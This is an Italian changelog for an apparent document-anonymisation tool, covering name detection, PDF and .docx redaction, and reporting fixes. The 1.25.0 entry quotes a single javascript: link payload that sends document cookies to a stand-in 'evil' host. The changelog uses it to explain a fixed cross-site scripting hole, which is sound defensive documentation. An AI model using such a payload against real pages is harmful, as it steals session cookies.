# Changelog

## In lavorazione

### I cognomi composti passavano interi: «Walter Di Salvo» restava scritto

Il riconoscitore dei nomi lavora su **tratti continui di parole che non
sono parole comuni**. Quasi tutte le particelle dei cognomi composti sono
preposizioni, e quindi stanno — giustamente — fra le parole comuni: `di`,
`del`, `della`, `dei`, `degli`, `da`, `dal`, `dalla`, `lo`, `la`. La
particella **spezzava il tratto**, il nome si sbriciolava in due parole
isolate, e una parola sola non basta mai:

    Walter Di Salvo ha firmato   ->   Walter Di Salvo ha firmato

Dopo un titolo professionale usciva **mezzo nome**, che è il modo peggiore
di sbagliare — il documento sembra trattato e il cognome che identifica la
persona è ancora lì:

    Il sig. Walter Di Salvo      ->   Il sig. {{NAME_1}} Di Salvo

`de`, `li`, `lu` fra le parole comuni non ci sono, ed è tutta qui la ragione
per cui «Luca De Luca» funzionava e «Walter Di Salvo» no. Non l'aveva
deciso nessuno.

**Nell'elenco dei cognomi i composti c'erano già.** Centocinquantuno, ma
incollati e senza apostrofo — `disalvo`, `dipietro`, `damico`, `dangelo` —
perché la lista di provenienza era normalizzata così. Il dato esisteva da
sempre ed era irraggiungibile: bastava provare la forma incollata prima di
dire di no.

Ora la particella non spezza più, e si aggancia in tre modi, dal più forte
al più debole: la forma incollata è un cognome degli elenchi; davanti c'è un
nome di battesimo che negli elenchi c'è (ed è il nome a fare da prova,
esattamente come per un cognome che nessuno conosce); dopo c'è una parola
degli elenchi e davanti una che parola comune non è.

**La particella non conta come riscontro**: `di` non è il nome di nessuno, e
contarla darebbe a «Di Salvo» due prove al prezzo di una — cioè scavalcare
di soppiatto la soglia dei moduli, che di prove ne chiede due.

Il presidio è che tutto questo vive **dentro una sequenza di maiuscole**: il
«di» della prosa normale è minuscolo e qui non arriva mai. `Comune di Roma`,
`Corte di Cassazione`, `Ministero della Giustizia`, `Consiglio dei Ministri`
restano intatti, e c'è un banco che lo pretende.

`san`, `santa`, `santo` restano fuori dall'insieme: aprono i toponimi (San
Giovanni, Santa Croce), che sui documenti sono molti più dei cognomi.

### «Ciao Pietro»: il saluto dichiara che quello che segue è una persona

Un nome di battesimo **da solo** non basta mai, ed è una scelta pagata:
«Rosa», «Vera», «Costa», «Villa» sono nomi *e* parole italiane, e
sostituirli costerebbe più di quanto renda. Un nome isolato resta quindi un
sospetto — sta nel rapporto, resta nel testo.

Ma «Ciao Pietro» non è un nome isolato: davanti ha una formula che dice
cosa sia. È lo stesso genere di prova del titolo professionale, del nome
accanto a un indirizzo di posta e della firma in chiusura, che il motore già
usa. Una formula di **chiusura** dichiara che quello che segue è una
persona; una di **apertura** fa lo stesso all'inizio — ed è il caso più
frequente nelle email e nelle chat, dove il cognome spesso non c'è affatto.

Il confine è tutta la sicurezza della regola: dopo un saluto ci finisce di
tutto — «Ciao Team», «Salve Ufficio», «Gentile Cliente» — e l'essere
maiuscola non prova niente. La parola dev'essere **negli elenchi dei nomi**,
o la regola prenderebbe la prima parola di ogni messaggio che comincia con
«Ciao».

Il caso generale non si è mosso: «Pietro» da solo, senza saluto davanti,
continua a non essere toccato, e c'è un banco che lo pretende.

### Ottantacinque cognomi composti in più negli elenchi

La regola generica si appoggia al nome di battesimo davanti: «Walter Di
Maio» funziona senza che `dimaio` stia scritto da nessuna parte. Il cognome
**da solo** — un fascicolo, una firma, la casella di un modulo — non ha
niente a cui appoggiarsi, e lì l'unica prova possibile è che il cognome
risulti negli elenchi.

Misurato su trenta composti frequenti: la forma incollata già presente ne
copriva 13, la regola generica altri 13, e restavano fuori proprio quelli
senza nome accanto. Ora ce ne sono 117 dichiarati, di cui 85 nuovi — Di
Maio, Di Bella, Di Caro, La Rocca, Lo Russo, De Martino, Della Torre, Dal
Bosco, Degli Esposti — tutti nella forma incollata, che è quella in cui
l'elenco storico li teneva.

Il criterio è lo stesso di tutto il resto: cognomi italiani diffusi.
Nessuna variante inventata per simmetria — «deriso» era nella prima
stesura ed è stato tolto, perché è anche un participio, e una collisione
così non dà un errore: fa sparire una parola italiana da tutti i documenti,
in silenzio. C'è un banco che lo controlla.

**Sulla soglia dei moduli non cambia niente, ed è voluto**: un cognome da
solo è un riscontro solo, composto o no. Sul modulo ne servono due, ed è la
soglia che ha tolto 8 904 sostituzioni sbagliate.

### Dopo un titolo professionale usciva mezzo nome

Stessa causa, porta diversa, e questa faceva più danno. La regola del
titolo pota la coda finché trova parole comuni, per non inghiottire la
frase che segue — è il motivo per cui esiste. Su un cognome composto la
potatura lo smontava un pezzo per volta: prima «Salvo», che è anche una
parola, poi «Di», che è una preposizione. Restava:

    il sig. {{NAME_1}} Di Salvo

Il nome tolto e il cognome lasciato. Ora la potatura sa riconoscere la
particella: si ferma se la forma incollata è un cognome degli elenchi, o se
dietro la particella c'è un nome di battesimo che negli elenchi c'è.

I casi del banco finiscono apposta con una parola comune — Di **Salvo**, Di
**Natale**, Del **Vecchio** — perché sono gli unici che innescano la
potatura: con una coda qualunque il banco resterebbe verde anche col
difetto rimesso.

## 1.25.0 — Il rapporto che non vedeva l'età, e l'anteprima che un .docx non può avere come il PDF

Tre cose. Nessuna è una funzione nuova nel senso di «adesso fa altro»:
sono tre posti in cui il programma **non diceva** qualcosa che sapeva, o
**non si poteva usare** da chi apre Word tutti i giorni, o **impediva
la build che lo avrebbe riparato**.

### Quattro forme di età e sesso non finivano nel rapporto

Età e sesso non si tolgono, per scelta: restano nel testo e compaiono
nel rapporto. «Ho lasciato in chiaro 3 età, apposta» vale solo se sono
davvero tre. Quattro scritture vere non si vedevano, perché i gruppi
`(?i:…)` coprivano metà della parola e lasciavano fuori il pezzo che
conta:

* `45 anni d'ETÀ` — `et[àa]` stava fuori dal gruppo, quindi le maiuscole
  spegnevano il riconoscitore mentre `ETÀ 44` funzionava;
* `sesso: f` — `[MF]` accettava solo la maiuscola;
* `d' anni 78` — dopo l'apostrofo non c'era spazio, e «d'anni» attaccato
  sì, «d' anni» no;
* `Eta': 45` — apostrofo al posto dell'accento, come si scrive l'età in
  un documento battuto senza tasti accentati.

Nessun dato usciva. Il danno era il verbale che mentiva.

`et[àa]` sta **dopo** sia `d'` sia `di`: una prima stesura lo metteva
solo sul ramo `di`, e `45 anni d'ETÀ` veniva contato fermandosi
all'apostrofo. I due motori devono combaciare sul pezzo intero.

### L'anteprima prima/dopo anche per i .docx

Il PDF ce l'ha dalla 1.23.0: due pagine affiancate, si vede cosa è
sparito. Per Word non c'era, e il `.docx` è il formato in cui si
scrivono le lettere.

La forma **non può essere la stessa**, e lo dice a schermo. Un PDF ha
pagine perché qualcuno le ha impaginate; un `.docx` non le ha finché
Word non gliele dà, e Word non è una dipendenza. Quindi due colonne di
**contenuto** (mammoth, già nel pacchetto), e una riga che avverte:
questa non è l'impaginazione, il documento che consegni non sarà così.
Senza quella riga la funzione inganna.

**E quell'HTML non è nostro.** Va in pagina con `innerHTML`, ma il `.docx`
da cui viene l'ha scritto un cliente. La prima ripulitura era una lista di
cose vietate — via `<script>`, via gli attributi `on*=` — e mammoth in
effetti non produce script. Ma i **collegamenti** li produce, e dove punta
un collegamento lo decide chi ha scritto il file: un `.docx` con un
`Target="javascript:…"` produceva
`<a href="javascript:fetch('http://evil/'+document.cookie)">`, che passava
indenne da entrambe le regole. Un clic, e quel codice girava nella stessa
origine che apre i documenti dell'utente — che per questo prodotto è il
caso normale, non il caso limite.

Quindi non si elenca ciò che è vietato: si tiene solo ciò che serve. L'HTML
passa da un parser vero (BeautifulSoup, già nel pacchetto), sopravvivono gli
elementi del contenuto e gli attributi che li descrivono, e negli indirizzi
solo gli schemi che non eseguono niente — `http`, `https`, `mailto`, e i
relativi. Un collegamento normale resta cliccabile; uno che esegue perde
l'indirizzo e **tiene il testo**, perché il confronto prima/dopo deve
restare leggibile.

### Il cancello bloccava la build che lo avrebbe fatto passare

`test_installer` guardava il pacchetto già presente in `dist/` **dentro
il quality gate**, che `build_portable` lancia prima di ricostruire la
cartella. Un pacchetto a metà — copia interrotta, exe ancora aperto —
rendeva rosso il gate, e quindi impediva la build che lo avrebbe
rifatto. Il controllo è rimasto, ed è ancora capace di far fallire il
build: si fa **dopo** la copia, con `make_installer.py --controlla`.

### Già nel ramo da dopo la 1.24.0, e entra in questa release

* **macOS arm64**, `.dmg` con firma ad-hoc, senza i 99 USD Apple.
  Gatekeeper avvisa al primo avvio. Istruzioni in `docs/MACOS.md`.
* **Mr. Rao Plus** sui pulsanti della landing (Chrome, Edge, Firefox)
  con i loghi ufficiali, non quelli disegnati a mano.

## 1.24.0 — Il testo che non stava nel flusso, e tre volte «il dato spariva ma il rapporto mentiva»

Nessuna funzione nuova. Sei difetti, e cinque sono della stessa famiglia: il
programma faceva la cosa giusta e **raccontava un'altra cosa**. In un
programma sulla riservatezza è una famiglia che conta, perché chi consegna un
documento consegna anche quel racconto.

### Il PDF redatto conteneva ancora i dati delle note e dei campi modulo

Il testo di una nota gialla e il valore di un campo compilato **non stanno nel
flusso della pagina**: stanno in stringhe appese all'annotazione. La chirurgia
sui glifi — che era tutto quello che il modulo faceva — non ci arrivava. Il
file usciva chiamandosi `-redatto.pdf` con dentro un codice fiscale
**leggibile aprendolo con un editor di testo**, e il pannello diceva «Tutte le
pagine sono state trattate».

Era un limite dichiarato nel modulo, e finché la redazione si faceva da riga di
comando poteva bastare. Da quando c'è un pulsante nell'interfaccia non basta
più: lì l'unica frase che si legge è quella.

Ora la stringa si redige, e insieme si butta via **il disegno già pronto di
come il campo si vede** (`/AP`). È la metà che rende vera l'altra: il dato è
nel file due volte, e ripulirne una sola produce un documento che sembra
redatto e non lo è — la forma peggiore, perché passa qualunque controllo fatto
sul valore. I lettori che non ridisegnano il campo mostrano un campo vuoto, che
è l'errore dalla parte giusta.

Un modulo che non contiene dati personali non viene toccato: senza quella
condizione, ogni documento compilato sarebbe uscito visivamente vuoto anche
quando non c'era niente da nascondere.

### Una scansione in mezzo a pagine digitali usciva contata fra quelle trattate

Il rifiuto delle scansioni guardava il **documento**, non la pagina: scattava
solo se *tutte* le pagine erano immagini. Un PDF digitale con dentro un
allegato firmato a mano — cioè l'atto normale — prendeva la stessa strada di
una pagina senza niente da togliere.

Adesso quella pagina finisce dichiarata fra le non trattate, col motivo scritto.
Una pagina **bianca** invece resta silenziosa: chiamarla «non trattata» sarebbe
vero alla lettera e falso nel senso, e un allarme che si impara a ignorare è
peggio di nessun allarme.

### Le lettere in Word erano trattate come moduli

`.docx` e `.doc` non erano nell'elenco delle estensioni che sono prosa per
definizione, e chi resta fuori da quell'elenco si comporta come un modulo:
pretende **due riscontri invece di uno** prima di sostituire un nome. Cioè nomi
lasciati in chiaro nel formato in cui si scrivono le lettere.

Misurato sul corpus: **sei casi perdevano un nome** solo per essere arrivati in
`.docx` invece che in `.txt`, con dentro lo stesso identico testo. Che fosse una
dimenticanza e non una scelta lo diceva l'elenco stesso — `.rtf` c'era, `.pptx`
c'era, `.md` c'era.

### Un numero di telefono italiano veniva contato come SSN americano

`Tel. 078-05-1120` è un numero di Oristano e ha la stessa forma 3-2-4 di un
SSN. Il pacchetto inglese è acceso di serie, quindi il caso capitava sulla carta
intestata di chiunque, con le impostazioni di serie: il numero spariva —
riservatezza mai in gioco — ma il rapporto lo contava fra gli SSN.

L'unica cosa che distingue i due casi è l'etichetta davanti, e adesso il
riconoscitore la guarda: il candidato resta a chi viene dopo, e il passo dei
telefoni se lo prende. Senza quel passaggio di mano il numero resterebbe in
chiaro, che è molto peggio del difetto di partenza — e sono due test in due
versi opposti a tenerlo fermo.

Con il pacchetto inglese **spento** `SSN 078-05-1120` continua a diventare
`{{PHONE}}`, ed è giusto così: è il nome più preciso che si possa dare con i
riconoscitori che l'utente ha lasciato accesi, e l'alternativa sarebbe lasciarlo
in chiaro.

### L'esportazione in PDF ignorava il profilo scelto

Le rotte del PDF leggevano il modulo con una funzione che il profilo non lo
guarda. Chi convertiva con «Nessuna privacy» vedeva il Markdown intatto sullo
schermo e scaricava un PDF redatto: due risposte diverse alla stessa domanda,
nella stessa schermata, senza niente che lo dicesse.

Il verso era quello prudente — redigeva **di più**, non di meno — quindi non ha
mai perso un dato. Resta che il file consegnato non era quello visto. Ora la
regola sta in un posto solo, e una rotta nuova non può sbagliarla per
distrazione.

### Età e sesso: trovati, lasciati apposta, e finalmente **detti**

Non si tolgono mai, per scelta: chi lavora su una cartella clinica o su una
statistica del personale sta chiedendo proprio quei due dati. La frase che
regge quella scelta è «lasciate in chiaro 3 età, apposta» — e il programma le
trovava, le scriveva nel frontmatter, e sullo schermo non lo diceva.

Nel riquadro del risultato compare adesso un terzo conto, `👁 N in chiaro`,
accanto alle redazioni e ai sospetti. In ciano e non in ambra: l'ambra chiede
attenzione, e chiederla per un esito voluto insegna a ignorarla anche quando
serve. Il suggerimento elenca le categorie coi nomi leggibili, non con gli
identificatori del motore.

Lo stesso conto serve al terzo stato «segnala invece di sostituire», che aveva
lo stesso problema.

### E una guardia, perché il sito non vada online bianco

Le due pagine pubblicate hanno stile e codice scritti dentro la pagina, ammessi
dalla CSP **per impronta**: basta cambiare uno spazio nel sorgente senza
rilanciare il rigeneratore e il browser blocca tutto. Nessun errore, nessun
log, e nessuno se ne accorge finché non ci passa qualcuno.

Il rigeneratore era scritto con cura; il buco era che nessuno lo obbligava a
girare. Adesso un test lo rilancia su una copia e pretende che non cambi
niente — così coprendo in un colpo i tre modi di sbagliare, che sono tre e non
uno: sorgente modificato e rigeneratore mai lanciato, pagina pubblicata
modificata a mano, impronte rimaste indietro. Un test che si limitasse a
ricalcolare gli hash dai file pubblicati direbbe «tutto a posto» in tutti e
tre i casi.

### E i documenti

Un giro completo su tutta la documentazione ha trovato affermazioni diventate
false col tempo: una pagina che prometteva a chi legge in inglese una
protezione che il motore non dà più, un profilo offerto dall'interfaccia e
tolto dodici release fa, funzioni descritte come esistenti che non esistono, e
funzioni che esistono e nessuno descriveva. Il dettaglio sta nei documenti
stessi.

---

## 1.23.0 — Un PDF redatto che resta un PDF, una finestra sua, e il pacchetto «atti e pratiche»

### Un PDF entra, un PDF redatto esce

Fino a ieri un PDF entrava e ne usciva del Markdown. Chi deve archiviare o
depositare un atto vuole indietro **il documento** — e la strada ovvia,
rasterizzare le pagine e disegnarci sopra dei rettangoli, è la peggiore di
tutte: pesa ventidue volte tanto, rende il documento inutilizzabile, e quei
rettangoli **si tolgono in un minuto** perché il testo resta sotto.

Qui si tolgono i byte dei glifi dal flusso di contenuto e ci si mette il
segnaposto. Il PDF che esce è **ancora un PDF di testo** — selezionabile,
ricercabile — pesa uguale, e il dato non c'è più nel file.

**Misurato su 61 documenti veri, 1400 pagine: 985 valori da togliere, 985
tolti.** Tre pagine su 1400 non trattate, peso medio 0,94x, cinquanta secondi.
La verifica porta un numero che il modulo non calcola — il totale dichiarato
dal motore — perché altrimenti userebbe la stessa funzione con cui taglia e
uscirebbe verde senza guardare niente.

Dall'interfaccia: il pulsante compare **solo** se il documento di partenza è un
PDF, e apre l'**anteprima prima/dopo della stessa pagina, affiancate**.
Affiancate e non alternate: la domanda di chi guarda non è «com'è adesso» ma
«cosa è cambiato». Ogni segnaposto ha il suo **rettangolo verde scuro**, che è
ciò che rende la differenza leggibile a colpo d'occhio.

Tre cose che il pannello dice e che non sono decorazione: quante sostituzioni,
**quali pagine non sono state trattate** (sempre, anche quando sono zero: una
pagina finita nel ripiego **non è stata redatta**), e il rifiuto esplicito
delle **scansioni** — un PDF senza testo non ha glifi da togliere, e
disegnarci sopra dei rettangoli sembrerebbe una redazione senza esserlo.

Il PDF di partenza resta nella memoria del browser e le due chiamate lo
rispediscono: il server non conserva niente fra l'una e l'altra.

### Una finestra sua, invece di una scheda del browser

Stessa interfaccia, stesso server locale, ma senza barra degli indirizzi né
schede attorno — e nella barra delle applicazioni compare un'applicazione, non
una scheda fra le altre venti. Sotto c'è il motore di rendering già presente
nel sistema, quindi non ci si porta dentro un browser.

**La croce nasconde, non chiude**: Mr. Rao vive nella barra di sistema, e se la
finestra si portasse via il programma chi la chiude per sbaglio perderebbe il
sorvegliante delle cartelle e la scorciatoia sugli appunti. Si riapre dal menu
dell'icona, e si esce da lì.

E **niente finestra nera al doppio click**: il pacchetto è costruito senza
console, che si aggancia da sola solo quando c'è un comando da eseguire. Le
due cose vanno insieme — senza l'aggancio, `MrRao.exe convert file.pdf`
funzionerebbe *senza stampare niente*, che è il modo peggiore di rompersi.

### Il pacchetto «atti e pratiche»: catastali, numeri di pratica, targhe

### Una divergenza vera, e hanno ragione tutti e due

Per un notaio il riferimento catastale è il dato più sensibile della frase:
dice esattamente di quale immobile si parla, e da un foglio e una particella
si arriva al proprietario in un pomeriggio. Il numero di ruolo generale
identifica le parti quanto il loro nome.

Per un'azienda il numero di protocollo è ciò che permette di **ritrovare** la
pratica, e toglierlo rende il documento inservibile senza proteggere nessuno.
Non è un caso che «protocollo» e «repertorio» stiano già nel vocabolario di
ciò che il motore **non** redige: è quello che impedisce a ogni numero di
pratica di essere letto come un telefono.

Quindi non un interruttore nuovo ma un **pacchetto «atti e pratiche», spento
di serie** — perché una cosa che capovolge una scelta già presa non si accende
da sola. Due assi, come per i pacchetti nazionali: l'interruttore dice *quale
dato*, il pacchetto dice *per quale mestiere*, e c'è un test per ciascuno dei
due versi.

Dentro ci sono tre categorie, e ognuna è passata perché ha **qualcosa che sa
dire di no**:

- **riferimenti catastali** — servono foglio **e** particella insieme, il
  subalterno è facoltativo. Il foglio da solo è la pagina tre di una relazione;
- **numeri di pratica** (R.G., protocollo, repertorio, raccolta, cronologico)
  — l'etichetta è obbligatoria e **resta nel testo**: sparisce il numero,
  resta «Prot. n.». Servono due cifre o l'anno accanto, ed è quella la sola
  parte della regola capace di rifiutare: «Protocollo n. 5» di una convenzione
  non è una pratica, e «decreto legislativo 231/2001» nemmeno;
- **targhe** — `AB 123 CD` in maiuscolo. Il pattern propone, **l'alfabeto
  decide**: I, O, Q e U sulle targhe non esistono. La forma da ciclomotore
  (`AB 12345`) è troppo comune per reggersi da sola e pretende la parola
  «targa» davanti.

**Il prezzo, misurato e non stimato.** Col pacchetto spento — cioè di serie —
il corpus pubblico non si muove di un'unità (moduli in bianco 96 e 22, prosa
vera 893) e nessuno dei 217 casi di conformità cambia esito. Col pacchetto
acceso: 91 sostituzioni su 47 documenti, **guardate una per una** — `prot. n.
26597`, `rep. n. 8757`, `protocollo n. 61238`. Sono tutte numeri di pratica
veri: zero falsi positivi.

Una trappola pagata durante la misura: `Protocollo 2024/000123` è
anno-barra-progressivo, e con il numeratore limitato a quattro cifre il
pattern ripiegava sull'altra alternativa e sostituiva **metà numero**,
lasciando `{{PRATICA}}/000123` nel testo. È peggio di non sostituire, perché
sembra fatto.

### `ORG` no, e non è un rinvio

Era la quarta categoria del gruppo, ed è l'unica che non ha niente capace di
dire di no. Con le sole sigle prende `Rossi S.r.l.` e perde `Banca Intesa`;
con un vocabolario di ragioni sociali prende ogni maiuscola del documento. E
il costo cadrebbe dove sbagliare si vede di più: il nome di un'azienda in un
atto **è il contesto**, e toglierlo lascia una frase che non dice più di che
pratica si parla.

### Età e sesso: si trovano, si dicono, non si tolgono mai

Sono quasi-identificatori, ed è una categoria diversa da tutto il resto del
motore. «45 anni» da solo non identifica nessuno, ma insieme a un comune
piccolo e a una professione sì — ed è esattamente così che si de-anonimizza un
archivio.

Non hanno un segnaposto, e non è una dimenticanza: **non esiste nessun
percorso che li sostituisca**. Chi lavora su una cartella clinica, su una
statistica del personale o su una perizia sta chiedendo proprio quei due dati,
e toglierli non protegge nessuno di più mentre rende il documento inservibile.
Lasciarli in silenzio, però, vuol dire che chi rilegge non sa che ci sono.

Quindi la terza via: restano nel testo e **compaiono nel rapporto**, nel
blocco `detected_not_replaced`. «Lasciate in chiaro 3 età, apposta» è
un'informazione che un DPO può usare per decidere; il silenzio no.

Si guardano solo dove il contesto è una dichiarazione — `di anni 45`, `45 anni
di età`, `età: 45`, `45enne`, `sesso: F`, `genere femminile`. Il `45 anni`
nudo no, ed è dichiarato: è quasi sempre una durata, e prenderlo riempirebbe
di segnalazioni ogni relazione aziendale.

Nessuna capacità è perduta: chi li vuole togliere davvero ha già l'elenco
«nascondi sempre», ed è questo a rendere onesta la scelta di non offrire la
sostituzione.

### E poi il richiamo, che è la metà che non avevamo misurato

Delle tre categorie sapevamo quanto **costano** — zero falsi positivi su 47
documenti pubblici, 91 numeri di pratica guardati uno per uno. Non sapevamo
quanto ne **perdiamo**, ed è la metà che conta di più: un falso positivo si
vede rileggendo, un dato perso no.

Il corpus non dice dove stanno i riferimenti catastali, quindi si tende una
**rete più larga del motore** e si guarda cosa prende lei e non lui. La rete
non è la verità — prende anche cose che non sono dati personali — è un elenco
di candidati da leggere a mano.

Su un corpus di atti italiani, 29 297 righe: **catasto 100%, targa 99,1%,
pratica 53,9%.** Quel 53,9% erano quattro difetti veri, tutti invisibili
leggendo il codice:

- **`Rac.` con una c sola.** È l'abbreviazione che gli atti notarili usano
  davvero accanto al repertorio — «Rep. 55231 Rac. 7814». Chiedendo le due c
  si perdevano 6 728 numeri di raccolta;
- **il ruolo generale senza punti**, «fattura RG 87220/2020». Si accetta solo
  nella forma numero-barra-numero, perché `RG` nudo è anche la sigla della
  provincia di Ragusa: l'anno è ciò che distingue le due cose, e senza quella
  condizione «Ragusa RG 97100» perderebbe il CAP;
- **il `n.` maiuscolo.** Stava fuori dal gruppo insensibile al caso, quindi un
  atto scritto tutto in maiuscolo — `REPERTORIO N. 182/2023` — non veniva
  riconosciuto. Un carattere di differenza, e nessun test se ne accorgeva;
- **«targato», non solo «targa»**, che in un verbale è la forma più comune.

E una decisione ribaltata, con la misura in mano: fino a ieri il minuscolo era
escluso perché «una targa si scrive maiuscola sempre». Non è vero — 135 targhe
minuscole nel corpus — e il costo vero veniva dal caso **misto**, non dal
minuscolo: l'unico falso positivo che nasceva era `ge 021 CV`, un frammento di
OCR dentro una frase sulle clementine. Chiedendo che le quattro lettere abbiano
tutte lo stesso caso si recuperano le 135 e si rifiuta lui.

**Dopo: 100%, 100%, 100%.** E il prezzo, misurato: sul corpus pubblico non si
muove niente (893, 96, 22), e con il pacchetto acceso le sostituzioni restano
91, le stesse di prima.

Il banco è `scripts/bench_richiamo_atti.py`, e non pubblica una percentuale di
richiamo: il denominatore è una rete scritta a mano, non una verità, e
spacciarlo per richiamo sarebbe un numero che sembra solido e non lo è.

**E la prova su 900 PDF veri va letta al contrario di come sembra.** Su
documenti tecnici e aziendali la rete trova 16 «targhe» e il motore ne prende
**zero**: sono `ge 021 CV`, `in 250 ml`, `da 140 Kg` — la rete che pesca due
lettere attorno a tre cifre. A rifiutarle sono esattamente le due regole che
sembravano pedanteria: l'alfabeto delle targhe (in `in 250 ml` la «i» non
esiste sulle targhe) e il caso uniforme (`ge 021 CV` è misto). Uno zero per
cento che è il risultato giusto.

Stessa cosa per `protocollo 802.1X`, che è un protocollo di rete e resta dove
sta: è la regola delle due cifre a rifiutarlo, la stessa che rifiuta
«Protocollo n. 5» di una convenzione. E lo stesso motivo per cui `Rep. n. 2`
di un'ordinanza **non** viene preso: è una rinuncia dichiarata, non una svista,
e il suo prezzo era stato misurato.

### `TIME` non si fa

Le tassonomie dei motori a riconoscimento automatico elencano gli orari
accanto alle date. «Alle 14:30» non identifica nessuno: quello che identifica
è la data, che trattiamo già. E un orario ha la forma di una durata, di un
punteggio e di metà delle celle di un foglio di calcolo — paga tantissimo e
rende quasi niente. Nei verbali, poi, toglierlo rompe il documento.

## 1.22.0 — Tre falsi positivi, e il segnale che avevamo sotto il naso

### Il nome accanto a un codice fiscale è una persona

Le regole sui nomi erano quattro, e quella che copre la maggior parte dei casi
— nome e cognome **entrambi riconosciuti negli elenchi** — ha un buco preciso:
non può scattare su una persona che negli elenchi non c'è.

Quanto fosse grande quel buco non si sapeva, perché il corpus con cui
misuriamo il richiamo ha i nomi che stanno nei nostri elenchi: **il 99,98%**.
Prendendo le sue frasi e sostituendo i nomi con altri fuori elenco — stesso
testo, stesso contesto — il richiamo passa da **99,4% a 0,5%**. Tutto il
riconoscimento veniva dagli elenchi. Niente dal contesto.

E in quelle stesse frasi c'era un segnale che il motore calcolava e buttava
via: `Elicio Nazar CF MNTCRL58D07H163B`. Un codice fiscale **passa il
carattere di controllo**, quindi non capita per caso, e in Italia si rilascia
a una persona fisica. È la dichiarazione più forte che questo motore possa
leggere — più di un titolo, che si scrive anche davanti a un ente, e più di un
indirizzo di posta, che può essere di un ufficio.

**Da 0,5% a 36,0%** su 78 372 nomi che i nostri elenchi non contengono.

### E i ruoli, che erano ancora più frequenti

Guardando cosa restava in chiaro dopo il codice fiscale, i nomi persi non
erano nudi: erano preceduti da un **sostantivo di ruolo** che dichiara una
persona. `cliente` da solo ne precedeva 2 671; poi `utente`, `acquirente`,
`locatore`, `conduttore`, `paziente`, `testimone`. Più la forma a campo
`NOME= Elicio Nazar;`, tipica degli estratti di record, dove il testo attorno
non aiuta per niente.

È la stessa forma del titolo professionale, su un sostantivo invece che su
un'onorificenza — ma con un rischio in più, e per questo i ruoli **pretendono
nome e cognome**: un titolo si scrive quasi solo davanti a una persona, un
ruolo anche davanti a un'azienda.

Due parole non bastavano. `il cliente Beta Consulting S.p.A.` usciva
`il cliente {{NAME}} S.p.A.`, che è il falso positivo peggiore possibile su
una riga che parla di una società. Ora le sigle societarie si cercano in
**due posti**: dopo il nome, e come ultima parola presa — perché su
`Delta Systems Ltd` la finestra se la inghiotte, e guardando solo il testo
che segue quel caso passava.

**Da 36,0% a 71,0%.** I nomi persi in silenzio passano da 50 127 a 22 743.

**Il prezzo, misurato: zero.** I moduli in bianco sono identici a prima, la
prosa vera non cala, e il corpus di conformità non cambia in nessuno dei 191
casi. La regola aggiunge solo dove c'è un codice fiscale valido.

Non prende le ragioni sociali: `Comune di Pontremoli CF …` resta intero. È la
forma in cui quel numero compare più spesso in un documento amministrativo, e
prenderla vorrebbe dire togliere il soggetto alla frase.

### `on` era un titolo, e il punto era facoltativo

`reported on Form 1125-A` usciva `reported on {{NAME_1}} 1125-A`. `included on
Schedule K` perdeva la parola `Schedule`.

Nell'elenco dei titoli professionali c'era **`on`** — l'abbreviazione di
«onorevole» — e la regola accettava il punto come facoltativo. Risultato: ogni
`on` seguito da una parola maiuscola diventava una persona. In inglese `on` è
una preposizione, quindi succedeva a ogni riga.

**Non è un difetto dei documenti inglesi**, ed è la cosa che avevamo capito
male: `Income included on Quadro K` sbagliava identico in italiano. I documenti
inglesi lo *rivelano*, non lo causano.

Ora c'è una classe di abbreviazioni che pretendono il punto: `On. Mario Rossi`
funziona, `on Form` no. Chi scrive «On Mario Rossi» senza punto perde questa
regola ma non il riconoscimento — nome e cognome adiacenti ne hanno una loro.

**Nomi inventati sui moduli fiscali statunitensi in bianco: da 100 a 2.**

### E altri due, dallo stesso posto

**`at` nudo letto come chiocciola.** `available at IRS.gov`, `visit us at
IRS.gov`, `estimator at www.irs.gov` finivano tutti in `{{EMAIL}}`: dieci
falsi positivi su undici, su moduli che non contengono un solo indirizzo di
posta. Ora un `at` senza parentesi pretende che **anche il punto sia
offuscato** — `mario at esempio dot it` resta riconosciuto, `available at
IRS.gov` no. Chi maschera un indirizzo lo maschera tutto.

**Civico attaccato al tipo di via.** `43 Court` (da «43 Court Ordered
Payments»), `225 St`, `2 Circle` erano indirizzi. Ora fra il numero e il tipo
di via serve almeno una parola: è il nome della strada, e in un indirizzo vero
c'è sempre.

**Il costo è misurato: zero.** Richiamo invariato su 29 297 documenti — nomi
99,4%, email 99,9%, IBAN 99,8%, carte e codice fiscale 100%. Il corpus di
conformità cambia in **un solo caso su 191**, e quel caso era il difetto
congelato come comportamento atteso.

### Il banco che non poteva girare

Tutti e tre sono usciti da `bench_corpus_pubblico.py`, che **non girava**.
Senza corpus si autoescludeva, con il corpus ricostruibile falliva
sull'impronta — e l'impronta diversa faceva `return`, saltando anche i
controlli che con l'impronta non c'entravano niente. 226 sostituzioni su
documenti senza dati personali, mai guardate da nessuno.

Ora l'impronta **avvisa e prosegue**. E la soglia è cambiata, perché era
sbagliata in partenza: «zero» è falso su qualunque modulo ufficiale, che porta
i recapiti dell'ente che lo pubblica e a volte la firma di una persona vera —
`Rossella Orlandi` su un provvedimento dell'Agenzia delle Entrate non era un
falso positivo, era un'etichetta sbagliata del corpus. Adesso è un **ratchet
per categoria**: crescere è un guasto, calare passa senza dover rigenerare
niente.

## 1.21.0 — Un installer, e quattro modi di prendere Mr. Rao che dicono in cosa differiscono

Fino a ieri le confezioni erano due: lo zip portable e l'MSIX per il
Microsoft Store. In mezzo mancava il caso più comune su Windows — scarico un
file, doppio clic, installato — e chi non voleva scompattare uno zip non
aveva una strada.

Adesso ce n'è una terza, **costruita dalla stessa build delle altre due**:
`MrRaoSetup.exe`, fatto con Inno Setup dal workflow che già produce lo zip e
l'MSIX. Installa in `%LOCALAPPDATA%\MrRao` senza chiedere l'elevazione, mette
la voce in «App installate» e si disinstalla da lì.

### Quello che l'installer non fa, ed è la parte importante

Non sa niente di collegamenti, di menu contestuale e di estensioni: **chiama
`mr_rao_shell.ps1`**, lo stesso script che usa `Installa Mr Rao.bat`.

Non è pigrizia. Quello script esiste proprio perché era già successo il
contrario: quando l'elenco delle dieci estensioni viveva in due file, i due
sono andati fuori sincrono e la disinstallazione lasciava voci di menu che
puntavano a un eseguibile non più esistente. Riscrivere quelle undici chiavi
dentro il copione dell'installer avrebbe ricreato lo stesso difetto con una
confezione in più. C'è un test che lo impedisce, e nel primo giro ha bocciato
il copione per il `.txt` di `LEGGIMI.txt`: guardava la stringa invece
dell'uso, ed è stato stretto.

Stessa storia per la versione precedente, che l'installer **rimuove** invece
di sovrascrivere: aggiornando dalla 1.3.2 alla 1.3.3 erano rimasti sul disco
